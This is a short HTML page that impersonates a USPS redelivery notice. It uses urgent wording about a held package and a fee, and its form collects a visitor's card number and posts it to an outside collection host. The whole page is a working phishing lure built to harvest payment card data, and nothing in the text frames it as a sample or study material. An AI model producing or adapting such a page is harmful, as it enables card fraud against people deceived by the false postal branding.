<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>USPS Redelivery</title></head>
<body>
  <h1>USPS Redelivery</h1>
  <p>Immediate action is required: your package is held pending a small redelivery fee. Pay the fee to release your parcel for delivery today.</p>
  <form action="https://secure-pay-collect.example/charge" method="post">
    <label>Card number <input name="card-number" type="text"></label>
    <button type="submit">Pay redelivery fee</button>
  </form>
</body>
</html>
